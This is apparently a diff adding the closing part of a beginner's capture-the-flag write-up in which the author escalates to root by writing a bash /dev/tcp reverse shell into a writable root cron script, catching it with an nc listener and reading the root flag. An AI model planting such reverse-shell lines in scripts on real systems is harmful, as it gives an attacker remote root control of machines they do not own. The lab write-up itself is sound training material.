@@ -377,3 +377,77 @@ LOGNAME=root
 7       10      cron.weekly     run-parts --report /etc/cron.weekly
 @monthly        15      cron.monthly    run-parts --report /etc/cron.monthly
 ```
+
+Noticed there was a cronjob using a script let see if we can edit it
+
+let's navigate to *cd /var/www/* and see what we can do with this script
+```
+b----g@kral4-PC:/var/www$ ls -al
+total 16
+drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
+drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
+drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
+-rwxr-xr-x  1 boring boring  148 Apr  8 11:26 .mysecretcronjob.sh
+```
+looks like we are in luck, i was able to inject a bash tcp reverse shell into
+script
+```
+#!/bin/bash
+# i will run as root
+echo "bash -i >& /dev/tcp/--.-.---.--/9001 0>&1"
+0<&196;exec 196<>/dev/tcp/--.-.---.--/9001; sh <&196 >&196 2>&196
+```
+
+Let's move back to our attack machine and start a listener
+
+nc -lvnp 9001
+```
+nc -lvnp 9001
+listening on [any] 9001 ...
+```
+
+Now on the target machine let run the script
+
+*./.mysecretcronjob.sh
+```
+b----g@kral4-PC:/var/www$ ./.mysecretcronjob.sh
+bash -i >& /dev/tcp/--.-.---.--/9001 0>&1
+./.mysecretcronjob.sh: line 4: 196: Bad file descriptor
+./.mysecretcronjob.sh: connect: Connection refused
+./.mysecretcronjob.sh: line 4: /dev/tcp/--.-.---.--/9001: Connection refused
+./.mysecretcronjob.sh: line 4: 196: Bad file descriptor
+*Script came back with an error but the listener still pickup
+```
+
+Listen established a connection
+```
+nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.9.239.22] from (UNKNOWN) [10.10.175.159] 41734
+ls
+html
+whoami
+root
+cd /root
+ls
+pwd
+/root
+ls -al
+total 40
+drwx------  5 root root 4096 Jun 15  2020 .
+drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
+-rw-------  1 root root  883 Jun 15  2020 .bash_history
+-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
+drwx------  2 root root 4096 Jun 13  2020 .cache
+drwx------  3 root root 4096 Jun 13  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
+-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
+cat .root.txt
+flag{6------------------------------5}
+
+###Winner, Winner, Chicken Dinner###
+This is my first write up. I am pretty excited because because this was as challenging
+as the box Easy Peasy is not so easy this box challenges you a many different levels.
+Happy Ethical Hacking
